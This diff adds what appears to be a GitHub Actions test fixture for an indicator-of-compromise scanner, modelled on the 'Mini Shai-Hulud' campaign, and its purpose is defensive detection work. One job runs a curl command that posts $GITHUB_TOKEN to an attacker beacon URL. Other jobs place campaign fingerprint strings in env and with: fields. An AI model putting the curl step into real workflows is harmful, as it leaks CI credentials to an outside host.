@@ -1,0 +1,32 @@
+name: Known IOC fixture — Mini Shai-Hulud (TeamPCP, May 2026)
+# Each block plants one of the FG-025 indicator strings in a different
+# step field (Run, Env, With, Uses) to exercise haystack coverage.
+on: push
+jobs:
+  exfil-run:
+    runs-on: ubuntu-latest
+    steps:
+      - name: curl to attacker C2
+        run: |
+          echo "totally benign"
+          curl -sS https://t.m-kosche.com/beacon -d "$GITHUB_TOKEN"
+  env-marker:
+    runs-on: ubuntu-latest
+    steps:
+      - name: env value contains fingerprint
+        env:
+          NOTE: "IfYouInvalidateThisTokenItWillNukeTheComputerOfTheOwner"
+        run: echo "$NOTE"
+  with-marker:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
+        with:
+          # reversed Shai-Hulud marker shows up in repo descriptions; same
+          # campaign signature smuggled into a with: input here.
+          ref: "niagA oG eW ereH :duluH-iahS"
+  clean-job:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo "nothing to see here"
+      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
